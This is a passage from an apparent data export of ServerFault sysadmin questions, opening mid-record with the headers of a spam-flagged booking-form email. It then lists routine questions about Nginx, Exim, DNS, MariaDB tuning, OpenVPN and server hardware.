          Sun, 01 Apr 2018 01:41:08 -0700 (PDT) ARC-Seal: i=1; a=rsa-sha256; t=1522572068; cv=none;
          d=google.com; s=arc-20160816;
          b=kOGFrsw6/wJLxIReIL12wZeYZdk0OAXmYPoHADnQu/kPyaII5IBkjiJtVq1ectxgKb
           fyuyxIgDPtEiL3kIS3Sd8EX7Z/UmnuRXgU0fZulaqYEHPTmjYX13gte7jIwyFt9xrmS+
           upP350D6r/e78fZ59VQEBn/EpiEXzx5qXzrs+5rHJL4Q0Hx85iubcRCrTuAZTL1G7fMW
           S+L0ICNB6FdVGtavEJ/kkO9HQ8WiFMMXl8sjO5njZ6Y69bWHwQmUdvxGGQJqZ/tCZl7i
           IivD3F+RBTy0g+eNUPPS3QAuE137VpH/hOpebbqvCnQ1v6L6uehoClLWnxE0uaWygYtH
           9HpQ== ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
          h=message-id:content-transfer-encoding:subject:date:to:from
           :mime-version:dkim-signature:arc-authentication-results;
          bh=bn7+s34wuVRWkhEjP3SOwwkq3H72XHOcSfQ+Jjevh/g=;
          b=Hrl5BtIzDaI2afnGo3cdr5R6wuyGGYYED1X4SvIxA+9xFC7sbNJ2eaYOah6PkCNhEz
           N7uqJeVr+uJyPC+p60uUW/HeUSxk/ofF/HedNh+/3MVSI5xg3plevJ6Rcr7VGUHWvrmK
           P45pybSIgacboyXjm0yI4u6nWSE3SR7q+7SJB6e9D7UlD9vpW+H1cxqSdU1tNlvhypNX
           lXQmFXShYI0BTBknI6ZZPSULTSC/S7YAJNNaalHwZLTX/A3PouRPm5uyzg+libCIILhI
           RDGtqb8agegys/Z73WpODRtTr8VcvGJ/Q/uyr5cPfPPmplrBbWUdwdcQGp2idlpmX/L0
           Au4Q== ARC-Authentication-Results: i=1; mx.google.com;
         dkim=pass header.i=@open-plant.com header.s=dkim header.b=p6W2jXTI;
         spf=pass (google.com: domain of hairextensionspecialistperth@open-plant.com designates 139.99.169.193
  as permitted sender)
  smtp.mailfrom=hairextensionspecialistperth@open-plant.com;
         dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=open-plant.com Return-Path:  Received:
  from mail.open-plant.com (mail.open-plant.com. [139.99.169.193])
          by mx.google.com with ESMTPS id q2si8171457pgc.401.2018.04.01.01.41.08
          for 
          (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
          Sun, 01 Apr 2018 01:41:08 -0700 (PDT) Received-SPF: pass (google.com: domain of hairextensionspecialistperth@open-plant.com
  designates 139.99.169.193 as permitted sender)
  client-ip=139.99.169.193; Authentication-Results: mx.google.com;
         dkim=pass header.i=@open-plant.com header.s=dkim header.b=p6W2jXTI;
         spf=pass (google.com: domain of hairextensionspecialistperth@open-plant.com designates 139.99.169.193
  as permitted sender)
  smtp.mailfrom=hairextensionspecialistperth@open-plant.com;
         dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=open-plant.com Received: from vps176044.vps.ovh.ca (localhost [127.0.0.1]) by
  mail.open-plant.com (Postfix) with ESMTP id D43607F31E for
  ; Sun,   1 Apr 2018 10:41:06 +0200
  (CEST) Authentication-Results: vps176044.vps.ovh.ca (amavisd-new);
  dkim=pass (1024-bit key) reason=""pass (just generated, assumed good)""
  header.d=open-plant.com DKIM-Signature: v=1; a=rsa-sha256;
  c=relaxed/simple; d=open-plant.com;<br>
  h=content-transfer-encoding:content-type:content-type:subject
  :subject:date:date:to:from:from:mime-version; s=dkim; t= 1522572066;
  x=1523436067; bh=6VMYMtWMt/JbToNyl363VUxznq1GyZUepKW Tv0hWYy8=;
  b=p6W2jXTIlVNpi5v0/FwX8/n0BZEA2+DiGyyn4hHmavqiX1PFhQo
  UNsLxwbBwjh9pmZK2lBxUf9pTkgZAWfVyqlv3cFsQj2Tp8Jc2zrorutfIpj3RJ8o
  HMKhSnsVRzPYZhheLpjbzZx7VbomLaqGXi5eRzaAdq9KPUu7Y8yAGBmE=
  X-Virus-Scanned: Debian amavisd-new at open-plant.com X-Spam-Flag: NO
  X-Spam-Score: 2.094 X-Spam-Level: ** X-Spam-Status: No, score=2.094
  tagged_above=2 required=6.31 tests=[ALL_TRUSTED=-1,
  HTML_MESSAGE=0.001, HTML_MIME_NO_HTML_TAG=0.635, MIME_HTML_ONLY=1.105,
  MISSING_MID=0.14, TVD_RCVD_SINGLE=1.213] autolearn=no
  autolearn_force=no Received: from mail.open-plant.com ([127.0.0.1]) by
  vps176044.vps.ovh.ca (vps176044.vps.ovh.ca [127.0.0.1]) (amavisd-new,
  port 10026) with ESMTP id KBPnmKoABbD2 for
  ; Sun,   1 Apr 2018 10:41:06 +0200
  (CEST) Received: from AZRINLAPTOP (cor9-ppp5856.bur.dsl.connect.net.au
  [210.10.146.14]) by mail.open-plant.com (Postfix) with ESMTPSA id
  79D497F31C for ; Sun,   1 Apr 2018
  10:41:06 +0200 (CEST) MIME-Version: 1.0 From:
  hairextensionspecialistperth@open-plant.com To:
  openplantsolutions@gmail.com Date: 1 Apr 2018 16:41:06 +0800 Subject:
  We will contact you back shortly! Content-Type: text/html;
  charset=us-ascii Content-Transfer-Encoding: quoted-printable
  Message-Id: &lt;20180401084106.D43607F31E@mail.open-plant.com></p>
  
  <p><h1>Thank you for booking. We will contact you shortly</h1><br>A
  booking re= quest was made by YOU with the following
  details:<br><br>Name: qwertt<br>Co= ntact: 04333222<br>Email:
  openplantsolutions@gmail.com<br><br>Personal Mess= age:<br>HEY  THIS
  IS NEW</p>
</blockquote>
","<email><email-server><spam-marked>","2018-04-01 08:48:54"
"905535","What to use instead of PM2 for non-Node.js applications?","<p>I'm thinking of switching from Node.js to another programming language (Elixir). And in Node, I've used PM2 as a process manager. Now, the thing is, I don't want to use PM2 for process management, since I would need Node as a dependency and PM2 is more for Node.js application processes (although I know that you can run non-Node applications with it).</p>

<p>So, my question is: what can I use as a PM2 replacement for non-Node.js applications?</p>

<p>Features that I need from this tool:</p>

<ul>
<li>listing processes and getting their stats (CPU, memory etc.)</li>
<li>tasks for starting/restarting/deleting processes</li>
<li>auto-restart process on crash</li>
<li>logs displaying and storing</li>
<li>(optional) some monitoring tools (something like Prometheus)</li>
<li>(optional) auto-restart process on files change</li>
</ul>
","<node.js><process>","2018-04-01 20:20:49"
"1023103","Office 365 login with only onmicrosoft domain?","<p>I'm at a company right now, where I was given two email addresses.</p>
<p>someDude@mycompany.com
someDude@n45564jck.onmicrosoft.com</p>
<p>I can receive email at someDude@mycompany.com using the outlook client, but I can't login to Office 365 with that.  I can only login to Office 365 using someDude@n45564jck.onmicrosoft.com.  Any idea what is going on here?  I thought when you added the MX record to the 365 Admin &gt; Domains &gt; mycompany.com it would allow login using the mycompany.com?</p>
","<domain-name-system><microsoft-office-365>","2020-06-27 03:34:50"
"834803","How to fake DNS switch","<p>So, I'm moving my website to another server and I had to change name servers for my domain.</p>

<p>It will take some time to propagate, but I was wondering if it were possible to trick my computer into thinking that domain name is already related to another server.</p>

<p>I tried to point my domain name to new server ip in my hosts file but I guess that isn't how it works. (I'm on windows btw)</p>
","<domain-name-system><nameserver><reverse-dns>","2017-02-24 20:43:47"
"957346","Windows 10 / Windows Server 2016 software compatibility","<p>I just installed a software on my Windows 10 computer that works fine.
Its an old software so it needs visual c++ redistribuables 2010 that I installed (both x86 and x64, latest SP1 versions) 
I tried to install it on a Windows server 2016 with the same redistribuables but I get an</p>

<blockquote>
  <p>The application was unable to start correctly (0xc000007b)</p>
</blockquote>

<p>error.</p>

<p>It would be hard to find the solution like this... I only want to know if there are some major incompatibilities between windows 10 and server 2016 or if my software should be able to start normally on this machine</p>
","<windows-server-2016><windows-10>","2019-03-08 11:28:44"
"905582","Utilizing my old Physical Server","<p>I have one question regarding a shared storage, hopefully, someone will help to choose. Long story short, I have an old Dell R710 server (Windows 2012) with a bunch of disks (6x2TB 7,2k NLSAS in Raid-10) which is utilizing right now as the fileserver. Currently, all my infrastructure is mixed, so I have 2 ESXi server which is running some VMs (such as exchange, AD, etc.) for my company. So my plan is to virtualize my fileserver and use all capacity of my physical box (R710) as the shared storage to my ESXi. I have found this article (<a href=""http://www.hyper-v.io/whos-got-bigger-balls-testing-nfs-vs-iscsi-performance-part-1-configuring-nfs/"" rel=""nofollow noreferrer"">http://www.hyper-v.io/whos-got-bigger-balls-testing-nfs-vs-iscsi-performance-part-1-configuring-nfs/</a>) about NFS vs. iSCSI and I just wondering which protocol is better to use for my situation? Thank you! P.S. I plan to add a 10 GB links to my boxes to achieve maximum performance.</p>
","<nfs><iscsi>","2018-04-02 09:31:38"
"1023139","Disk Support HP 400 SAS controller","<p>I receive a months ago an HP Proliant DL360 G5 with an HP Smart Array P400i Controller with 256 Mb, i have 2 sas 10k 72 Tb disk and i want to upgrade.
I buyed 4 HDD SAS 10K Hitachi 450 Gb, but the controller don't recognize them, the led will remain red in this units when i power on the server.
I think the firmware in the Controller is the last (7.24b version)
I read that this controller support disk until 1 Tb or more in SAS</p>
<p>Any Idea about this? Thanks!</p>
","<hard-drive><hp><sas><controller>","2020-06-27 12:55:39"
"1023156","Who assigns private IP addresses?","<p>Suppose I have a router and a local network, can I freely assign my devices private IP addresses (as many as I want, up till there are no more private IP addresses left)? Who decides how many private IP addresses I can have?</p>
","<ip><ip-address><private-ip>","2020-06-27 15:30:44"
"1023186","Debian-based servers can authenticate users on OpenLDAP when RH-based servers cannot","<p>I'm putting centralized authentication in my LAN infrastructure. The LDAP server is up and running, and all Debian/Ubuntu servers manage to authenticate users against the LDAP.</p>
<p>Now, all my CentOS8/Fedora32 machines just cannot. First, the client-side configuration is based on sssd, which differs a lot, but even then, once I've completed the client config, I can, typing <code>id $USER</code> get all of the user's UID, GIDs, etc, so I know that the config is sane.</p>
<p>Now, from the newly-configured as root, let's say I do this:<br>
<code># su - USER1</code> --&gt; succeeds, without asking a passwd (of course), creates the home dir<br>
<code># su - USER2</code> --&gt; (as root, again), succeeds again<br>
now... as USER2:<br>
<code>USER2$ su - USER1</code> --&gt; will prompt for USER1's password, and will fail.</p>
<p>From any other machine:<br><code>ssh USER1@LDAPCLIENT</code> --&gt; fails
same for any other user.</p>
<p>This makes me think that there might be something in the way that RH-based machines interpret passwords, regardless of the backend. I'm no expert in PAM, SSSD or any security mechanism, so I do not know.</p>
<p>Anyone knows enough about SSSD, PAM, NSS on RH vs Debian to enlighten me ?</p>
","<openldap><centos8><debian-buster>","2020-06-27 20:20:40"
"905691","How to disable port 80 on IPMI console for a rhel server?","<p>I have a requirement to disable http port for the IPMI console for a rhel server. Where should I start?</p>
","<redhat><rhel7><ipmi><ipmitool>","2018-04-02 22:36:18"
"1023214","PHP not connecting to my database on Linux?","<p>I use mariadb as my database and phpmyadmin to access on databases web on Linux. Although I am able to connect to the database on the commandline as root but cannot check connection to the database with PHP? I am unsure  if there's something I'm missing out?</p>
<p><strong>My HTML/PHP Code:</strong></p>
<pre><code>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;body&gt;
        &lt;?php
        $host = 'localhost';
        $user = root';
        $password = '';
        $db = 'testdb';

        $dbconnect=mysqli_connect($host,$user,$password,$db);

        if ($dbconnect-&gt;connect_error) {
                die(&quot;Database connection failed.&quot;);
        }

        ?&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>What my web page displays:</strong></p>
<p>&quot;connect_error) { die(&quot;Database connection failed: &quot; . $dbconnect-&gt;connect_error); } ?&gt; &quot;</p>
<p><strong>What I've tried:</strong></p>
<ul>
<li>Changing to <code>bind-address 0.0.0.0</code>.</li>
<li>Allowing the <code>port 3306</code> through
firewall.</li>
</ul>
<p>Still the same display.</p>
","<linux><php><database><mariadb>","2020-06-28 07:19:17"
"905710","Server advice for a newbie","<p>I'm new to serverfault, and server computers in general, and I got a few questions. Forgive me, they're quite basic, but I'd like the clarity.</p>

<p>So, lately I've been doing quite a few CPU intensive tasks on just standard workstations, and I realize my life would be a lot easier if I picked up a server to use as a CPU bot. When I say tasks, it includes things like testing hashes against wordlists. A friend of mine has an older HP server he's not really interested in anymore (<a href=""https://www.cnet.com/products/hp-proliant-dl140-g3-xeon-e5310-1-6-ghz-monitor-none-series/specs/"" rel=""nofollow noreferrer"">specs</a>), which he's willing to give away, which includes a mobo with two CPUs, 8GB of DDR2, and a 250gb HDD. It's left me with the following questions:</p>

<ul>
<li>Does the BIOS function like a normal workstation? As in, selecting boot devices, changing system settings, etc.</li>
<li>Could I install a, for example, Debian ISO via USB and expect it to work properly?</li>
<li>Does the server require any hardware to function that isn't included?</li>
<li>It's a rack server, and I don't have a server rack. Does that cause any issues? Could I just stand place it atop something, giving it a fair amount of breathability, and expect it to cool fine? (I'll only be using like 80% CPU).</li>
</ul>

<p>Thanks in advance. If you think there's any other info I need to know, feel free to tell me.</p>
","<debian><bios><cooling>","2018-04-03 02:19:08"
"834922","Optimize webserver to handle huge load spikes","<p>Our application is growing fast so now we need to scale the infrastructure to don't slow down the entire website without worrying on how many users we have</p>

<p>The backend system is based on many curl calls lasting 1-10 seconds and they need to be executed in parallel</p>

<p>We currently have a 4GB ram 4 core vps but sometime we get 503 error when all the 50 channels start in parallel (we setup 50 cron job) that execute 5 curl call/each</p>

<p>These numbers are going to increment fast so we need to find a solution to don't let the end user wait more than a minute to get his things done</p>

<p>Do we need a dedicated server, or it won't make much difference? Or set up aws lambda functions with sns queue? Amazon would be the best solution because whatever amount of sns messages we put in the queue and instantly they will get processed by enabling the trigger, but the lambda function currently don't support PHP so we would to rewrite all the code in Python</p>

<p>How would you manage this situation to improve the performance?</p>
","<vps><hosting><web><optimization>","2017-02-25 20:37:15"
"957496","Relaying mail for a machine with port 25 blocked","<p>I recently moved and had to start using a new residential ISP (my old one doesn't serve the new address yet). To my dismay, the new ISP has no option of unblocking the TCP/25 port even when you buy a static IP address, so my home server currently has no inbound/outbound email capability.</p>

<p>Assuming I can install a Raspberry Pi box at work where no ports are filtered, how could I proceed with working around this issue? Tunneling all my traffic through VPN is an overkill, I think.</p>
","<smtp><email-server><exim>","2019-03-09 12:22:28"
"905836","PCI Scan Fail on SSLv3 Supported port tcp/38933","<p>I got a PCI Scan Fail today on SSLv3 Supported port tcp/38933, tcp/40549 and tcp/41049. Any suggestions on what should I do?</p>
","<security><pci>","2018-04-03 19:26:00"
"906094","MYSQL consumes all CPU - WooCommerce","<p>We've have a shop with WordPress + WooCommerce.</p>

<p>Our Server has 24CPUs and 128GB RAM. A few days we had multiple orders at the same time and the CPU was totally overloaded and the website was down for a long time.</p>

<p>We're using MariaDB 10.2</p>

<p>Does anyone have experience if this is normal or is something wrong configured?</p>

<p>Here is the relevant part of my config file:</p>

<pre><code>#
# * Fine Tuning
#
max_connections         = 500
connect_timeout         = 5
wait_timeout            = 600
max_allowed_packet      = 16M
thread_cache_size       = 128
sort_buffer_size        = 4M
bulk_insert_buffer_size = 16M
tmp_table_size          = 32M
max_heap_table_size     = 32M

#
# * MyISAM
#
# This replaces the startup script and checks MyISAM tables if needed
# the first time they are touched. On error, make copy and try a repair.
myisam_recover_options = BACKUP
key_buffer_size         = 128M
#open-files-limit       = 2000
table_open_cache        = 400
myisam_sort_buffer_size = 512M
concurrent_insert       = 2
read_buffer_size        = 2M
read_rnd_buffer_size    = 1M

#
# * InnoDB
#
# InnoDB is enabled by default with a 10MB datafile in /var/lib/mysql/.
# Read the manual for more InnoDB related options. There are many!
default_storage_engine  = InnoDB
# you can't just change log file size, requires special procedure
#innodb_log_file_size   = 50M
innodb_buffer_pool_size = 256M
innodb_log_buffer_size  = 8M
innodb_file_per_table   = 1
innodb_open_files       = 400
innodb_io_capacity      = 400
innodb_flush_method     = O_DIRECT
</code></pre>
","<mysql>","2018-04-05 06:55:50"
"906102","Exim: send select outgoing mails through different server","<p>I regularly send out mails using different addresses from different domains. Let's take <code>mail@example.com</code> and <code>new@spf.com</code> as an example.</p>

<p>To keep things easy and centralized (as in: configuration is on the server, so I don't have to set up each client separately), I always use <code>smtp.example.com</code> as my outgoing mail server, which is an Exim on Debian.</p>

<p>Now, the admin of this fictitious <code>spf.com</code> has activated SPF and tells me that mails sent from my <code>@spf.com</code>-address through <code>example.com</code> might start getting filtered. Makes sense!</p>

<p>Of course, I now would go ahead and set up all the different clients I use (home PC, laptop, work machine, smartphone, …) so that mails from the different domains go out through their respective SMTPs. If you ever tried this, it's a hassle: Each client is different and not all are as easy to configure. It would be so much easier to tell Exim to:</p>

<ol>
<li>check outgoing mails before sending them,</li>
<li>""intercept""/filter out ones from <code>@spf.com</code>, and</li>
<li>""forward""/send those through smtp.spf.com (with the provided username and password) instead.</li>
</ol>

<p>This way, I could set up the whole thing once on the server and be done with it—every client would work ""out of the box"".</p>

<p>I've been having trouble searching for the correct terms to google for; I'd be surprised if Exim wasn't able to do something like this!</p>
","<exim>","2018-04-05 07:33:13"
"906265","Is there a way to dump MySQL table rows live? (similar to 'tail -f')","<p>Is there a way to (from the command line) continuously dump new rows added to a table?  As a comparison, in Bash we have tail -f to 'live-dump' a file as it gains data.  How could this be done for a MySQL table without a continuous loop to check for new rows?</p>
","<mysql>","2018-04-05 20:29:56"
"958032","SSL Certbot in a domain with 301 redirect and nginx","<p>I have one server at home working with a dynamic domain (mydomain.ddns.net) through my OpenWRT router. Now I want to host a web and I have bought a domain (www.mynewdomain.com) in GoDaddy and I have set up a 301 Redirect with masking (so people keep seeing www.mynewdomain.com instead of mydomain.ddns.net).</p>

<p>The problem is that when I run the 'sudo certbot --nginx' command, it can verify mydomain.ddns.net but not www.mynewdomain.com because 'The client lacks sufficient authorization :: Invalid response from www.mynewdomain.com/.well-known/acme-challenge...'</p>

<p>I have been searching and trying different stuff, most of them related to this piece of code:</p>

<pre><code>location ~ /.well-known {
    default_type ""text/plain"";
    root /var/www/html;
}
</code></pre>

<p>But it is not working. Probably because these solutions are not taking into account that I'm under a mask 301 redirect. Could someone help me? Thanks in advance.</p>
","<nginx><ssl-certificate><301-redirect><certbot>","2019-03-13 08:02:58"
"906395","Apache not respecting MinSpareServer and MinSpareServer in WHM/Cpanel Apache configuration","<p>I am using Apache 2.4 and event MPM on my centos server with WHM control panel.</p>

<p>I have set  <code>MinSpareServers</code> to 50 and <code>MaxSparServers</code> to 55 in    of 
Global Configuration of the WHM Apache configuration.</p>

<p>Yet, in Apache status, I see only 10-15 processes of Apache.
<a href=""https://i.sstatic.net/st2g9.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/st2g9.png"" alt=""screenshot of the apapceh status page""></a></p>

<p>Due to which most of my apache slots are  showing empty/dot ""."" in the scorecard.</p>

<p>Here is my apache scorecard :</p>

<p><strong>RR_R__R__RR__RRR______RW__R_____RR_R_____R______RRWRWRR__RRR_R
RRRRRRR_R_R.....................................................
......................__R___RR__R__________R__R.................
........_RRR___RW________________...............................
................................................................
.......................................................R_R_RR_</strong>
__________R__R_R.........................RRRRRR_RRRWRWRRRRRRRRRR
RR..............................................................
................................................................
................................................................
...................................RRRRW_RRRRRWRRRRRRRRRRRRR....
.....................RRRRRRRRRRRWRRRRRRRRR_WRWRRRWRRRRR_RWRRRRRR
RRRRRRR.........................RRRRRRRWR_RRRRRRRRRRR_RRR.......
................................................................
......................................................RRRRRRRRRR
RR_WWRRWRRRRRRR........................._RR_RRRR_RRRRRR_RR_RRR_R
R__RRRRRRRRRR_R_RRRRRR__RR......................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
................................................................
........</p>

<p>Note : If I set <code>StartServer</code> to 50 and restart my server, 50 processes are started but something kills and brings back the count to 10-15.</p>

<p>Am I missing something? Should not the number of apache processes running be between the values defined by  MaxSpareServers and MinSpareServers?</p>
","<centos><apache-2.4><centos7><load-testing>","2018-04-06 13:19:31"
"1023240","Could servers with different net-ids be in the same VLAN","<p>Could I theoretically have one server with an ip address of : 10.10.10.1 and another server with the ip : 10.10.11.2.
sign them the same vlan id on the switch, and have communication between them (say I give one of them a default gateway of the other)</p>
","<networking><ip><vlan>","2020-06-28 15:32:07"
"834954","Need to convert 1000 images in 5 seconds-- what are our options?","<p>we're looking for a server architecture that will allow for converting 1000 large images in 5 seconds. As a test, we ran some benchmarks using a 16 core server, using GNU Parallel to run 1,000 image conversions.</p>

<pre><code>ls -1 *.pdf | parallel --eta convert {} {.}.png
</code></pre>

<p>Each image takes around 1.0 seconds to convert, and with 16 cores running at 100% (monitored via htop), we were able to render all 1000 images in about 60 seconds.</p>

<p>We'd like to, someday (as budget allows), get this down to 5 seconds. We obviously need more servers working in a distributed environment-- we just don't know where to start.</p>

<p>What sort of server architecture, applications, tools, services, technologies, etc. would you suggest we look into?</p>
","<cluster><distributed-computing>","2017-02-26 03:58:49"
"1023262","Most Efficient Way to Force HTTPS in Nginx in 2020","<p>I want www and http to redirect to https in Nginx.</p>
<p>There are loads of opinions on how best to do this across the web and the best practices seem to have changed over the years. I've tried a handful of methods all of which seem to work, and that is somewhat concerning to me. I'd like to do it in the most efficient and accepted way. Is there any strong consensus in 2020?</p>
<p>Here's what I'm currently using. Open to any other suggestions as well. I'm using Let's Encrypt for certification and some of the code was automatically added by certbot.</p>
<pre><code>server {
  server_name www.example.com;
  return 301 $scheme://example.com$request_uri;
}

server {
  server_name example.com;
  root /var/www/mysite/public_html;
  index index.php index.html index.htm index.nginx-debian.html;
  access_log off;
  error_page 404 http://example.com;

  location / {
    try_files $uri $uri/ /index.php?$uri&amp;$args;
  }

  location ~ \.php$ {
    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
    include snippets/fastcgi-php.conf;
  }

  location /secret/ {
    internal;
  }

  location /hidden/ {
    internal;
  }

  # A long browser cache lifetime can speed up repeat visits to your page
  location ~* \.(jpg|jpeg|gif|png|webp|svg|woff|woff2|ttf|css|js|ico|xml)$ {
    access_log off;
    log_not_found off;
    expires 360d;
  }

  # Disable access to dot files LetsEncrypt needs access to well-known
  location ~ /\.(?!well-known).* {
    deny all;
    access_log off;
    log_not_found off;
    return 404;
  }

    listen [::]:443 ssl ipv6only=on; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot



}


server {
    if ($host = example.com) {
        return 301 https://$host$request_uri;
    } # managed by Certbot


  listen 80;
  listen [::]:80;
  server_name example.com;
    return 404; # managed by Certbot


}

</code></pre>
","<nginx><ssl><https>","2020-06-28 21:02:46"
"1023334","Does MX record conflict with A record?","<p>I am pretty new to networking.
I would like to buy a domain to setup a website and to use it also for emails.
To do this, I should need to configure an A DNS record and a MX one.
My question is... If I use a different server for emails than the one I use for the website (let's say I decide to use gmail with the custom domain), will email be sent ONLY to the server set up with the MX record, or will they also be sent to the A one? I'm asking because I saw a lot of configurations using a subdomain for emails, like &quot;mail.domain.com&quot;, and therefore there is no risk of conflicting IP resolutions.
I basically don't want that also the VPS provider receive the emails, as I want them to be handled only by Google</p>
","<domain-name-system><email>","2020-06-29 13:19:12"
"958321","SSD disks VS SATA disks and SAS disks","<p>as all know there are many type of disks
while the famous are</p>

<pre><code> SSD disks
 SATA disks 
 SAS disks
</code></pre>

<p>dose SATA/SAS disks can be nearly as SSD disks? about IO and performance?</p>

<p>how much SSD disks are better from the SATA/SAS disk</p>
","<linux><hard-drive><ssd><disk-space-utilization>","2019-03-14 18:52:44"
"1023417","Create a domain GPO with cmd only","<p>I have a domain controller running Server 2003 and the goal is to create a GPO for the domain without using a GUI program (no gpedit, gpmsc, etc.). How can I achieve this goal by using cmd only? (powershell doesn't exist on the server either)</p>
","<windows-server-2003><group-policy><domain-controller><windows-command-prompt><sysadmin>","2020-06-30 03:09:04"
"1023424","Does the linux bridge have in-built DHCP and DNS server?","<p>Does the linux bridge have a dhcp server built in to the bridge software?</p>
<p>And does the linux bridge support working as DNS-Server or it can only point towards the DNS server on the host or none. If none, then how does the VM's connected to the linux bridge resolve hostnames?</p>
","<domain-name-system><linux-networking><bridge><dhcp-server><virtual-network>","2020-06-30 05:12:50"
"958352","IPv4 is leaking when using an IPv6 proxy","<p>We've purchased access to a set of proxies which all have different public IPv6 addresses. When we access sites such as whatismyip.com, however, it shows that we also have a public IPv4 address. I've looked up these IPv4 addresses (such as 172.69.162.56) and they belong to Cloudflare. I was told that most likely we are ""leaking CDN"", but I don't understand what that means and I'm no longer in contact with the person who said it. There are only a few of these IPv4 addresses shared among the hundreds of IPv6 proxies, and I'm afraid they are being used to tie our proxies together. There has been evidence suggesting as much.</p>

<p>So I suppose my questions are:</p>

<p>1) Please explain what he means by leaking CDN or what is likely to be going on here.</p>

<p>2) Is there a way to block those IPv4 addresses from being exposed?</p>
","<networking><proxy><ipv6><ipv4>","2019-03-14 22:37:07"
"1023595","Sending files via FTP without IP addresses on PC's","<p>Can two PC's communicate with each other - FTP, without using IP addresses(entirely skipping Network Layer)? I know, FTP is client-server architecture, but I wonder if LAN network and MAC addresses are known, then technically two PC's can communicate via only NIC - MAC addresses, as a result there is no need for IP address in order two PC's could send files via ftp.
I ask, because I read that Network Layer exists to provide logical address to facilitate path determination for routers, then theoretically in small LAN without a need for Internet access, IP address for those PC's seems to be unneccesary.</p>
","<networking><ip><ftp><tcpip>","2020-07-01 11:33:44"
"1023622","How can I remove many files with names that are encapsulated in single quotes?","<p>I have a log directory with thousands of files that are named similar to this:</p>
<pre><code>''$'\351\243\216\346\211\207\343\200\201\347\273\204\345\220\210'' strutstore A'$'\350\241\250''.xlsx'
</code></pre>
<p>I want to delete any file that has a single quote in its name. I can't figure out how to match them. When I try:</p>
<pre><code>ls ''*
</code></pre>
<p>I get:</p>
<pre><code>ls: unrecognized option '----------------z-2020-02-12 ZTL-Y-.xlsx'
</code></pre>
","<linux><rm>","2020-07-01 14:56:39"
"835164","foo.service holdoff time over, scheduling restart --> Where can I change the holdoff time","<p>I see this message in my logs:</p>

<pre><code>systemd[1]: foo.service holdoff time over, scheduling restart.
</code></pre>

<p>I could not find the term ""holdoff time"" in here:</p>

<p><a href=""https://www.freedesktop.org/software/systemd/man/systemd.service.html"" rel=""noreferrer"">https://www.freedesktop.org/software/systemd/man/systemd.service.html</a></p>

<p>Where can I change the holdoff time?</p>
","<systemd>","2017-02-27 13:50:44"
"1023652","Options error: Unrecognized option or missing or extra parameter(s) in Test.ovpn:1: ÿþc (2.4.9)","<pre><code>Options error: Unrecognized option or missing or extra parameter(s) in Test.ovpn:1: ÿþc (2.4.9)
Use --help for more information.
</code></pre>
<p>I am quite confused with this error with my <code>ovpn</code> file... I have looked into this issue and the issue should be listed after the <code>Test.ovpn:1</code>, however, my <code>ovpn</code> file has no traces of the word <code>ÿþc</code>. What could this mean? What can I do to fix it?</p>
<p>Test.ovpn</p>
<pre><code>client
dev tun
proto tcp4-client
remote &lt;IP&gt; 
port &lt;Port&gt;
tls-client
tls-auth &quot;C:\\Program Files\\OpenVPN\\config\\ta.key&quot; 1
remote-cert-tls server
tun-mtu 1500
tun-mtu-extra 32
mssfix 1450

ca &quot;C:\\Program Files\\OpenVPN\\config\\ca.crt&quot;
cert &quot;C:\\Program Files\\OpenVPN\\config\\Test.crt&quot;
key &quot;C:\\Program Files\\OpenVPN\\config\\Test.key&quot;

cipher AES-128-CBC
comp-lzo
persist-key
persist-tun
verb 3
mute 20
</code></pre>
<hr>
<sub>
The <code>&ltIP&gt</code> and <code>&ltPort&gt</code> are the actual ports in the ovpn file...
</sub>
","<windows><vpn><openvpn>","2020-07-01 18:34:57"
"835210","Can php+mysql scale to handle 5000 request per second?","<p>I have web application build with php and mysql, and I except 5000 requests/sec in the first 6 months. and I register a dedicated server with <code>CPU intel Xeon 4 cores 3.3GHz, 16G ram, Uplink 1000Mbps, bandwidth 25TB</code>, and I tested the webserver using ab benchwork and the results is:</p>

<pre><code>for txt file : ab -n 10000 -c 1000 http://mywebsite.com/file.txt
results: 1500 requests/second
for php file with only echo ""test"";
results: 130 requests/second
</code></pre>

<p>I just want to know where is the bottleneck?. </p>
","<mysql><php><traffic><load-testing>","2017-02-27 17:02:28"
"1023803","Redirect HTTPS to another HTTPS site without warning","<p>I have recently moved a site over to a new domain. The hosting stayed the same, just a new URL for the site.</p>
<p>I want <a href=""https://oldsite.com"" rel=""nofollow noreferrer"">https://oldsite.com</a> to redirect to <a href=""https://newsite.com"" rel=""nofollow noreferrer"">https://newsite.com</a>.</p>
<p>I'm getting the Invalid Certificate warning. Is it possible to do this without getting the warning?</p>
<p>I've found this question and answer (<a href=""https://serverfault.com/questions/367818/redirecting-ssl-without-raising-an-alert"">Redirecting SSL without raising an alert</a>), but it doesn't quite apply since I'm going from one domain to another and not to a subdomain.</p>
","<https><redirect>","2020-07-02 20:41:53"
"1023884","VPS's memory consumption","<p>I have a VPS with ubuntu 18.04.4 with 2gb and 512mb swap. Working regularly with 600-800mb and 100mb swap and all is well.</p>
